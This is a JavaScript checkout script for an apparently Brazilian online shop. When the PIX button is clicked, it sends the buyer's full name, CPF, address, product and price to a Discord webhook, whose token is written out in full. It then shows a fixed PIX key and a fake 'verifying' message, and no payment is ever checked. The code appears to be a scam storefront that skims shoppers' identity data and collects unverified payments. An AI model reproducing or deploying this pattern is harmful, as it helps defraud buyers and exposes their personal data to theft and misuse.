document.addEventListener("DOMContentLoaded", function() {
    const buyButton = document.getElementById("buyButton");
    const checkoutForm = document.getElementById("checkoutForm");
    const paymentButton = document.getElementById("paymentButton");
    const paymentForm = document.getElementById("paymentForm");
    const pixButton = document.getElementById("pixButton");
    const pixDetails = document.getElementById("pixDetails");
    const purchaseForm = document.getElementById("purchaseForm");

    buyButton.addEventListener("click", function() {
        checkoutForm.classList.remove("hidden");
    });

    paymentButton.addEventListener("click", function() {
        paymentForm.classList.remove("hidden");
    });

    pixButton.addEventListener("click", function() {
        const fullName = document.getElementById("fullName").value;
        const cpf = document.getElementById("cpf").value;
        const address = document.getElementById("address").value;
        const product = document.querySelector("section.product-details h2").innerText;
        const price = document.querySelector("section.product-details p").innerText;

        const payload = {
            content: `**Nova Compra**\nProduto: ${product}\nPreço: ${price}\nNome Completo: ${fullName}\nCPF: ${cpf}\nEndereço: ${address}`
        };

        fetch('https://discord.com/api/webhooks/1250118523875758183/VNE5coODHerfrd-x0GwKuxVkWDRaKRJtEd422hVGwmyeCpbiROhWZaSzEeUaWrmKhZ6V', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        }).then(response => {
            if (response.ok) {
                pixDetails.innerHTML = `<p>Chave PIX: 12baf272-93b0-4596-a1f6-fc87499f4d9c</p>
                                        <p>Verificando...</p>
                                        <p class="loading">É quase seu!</p>`;
                pixDetails.classList.remove("hidden");
            } else {
                alert("Erro ao enviar as informações. Tente novamente.");
            }
        }).catch(error => {
            alert("Erro ao enviar as informações. Tente novamente.");
            console.error("Erro:", error);
        });
    });
});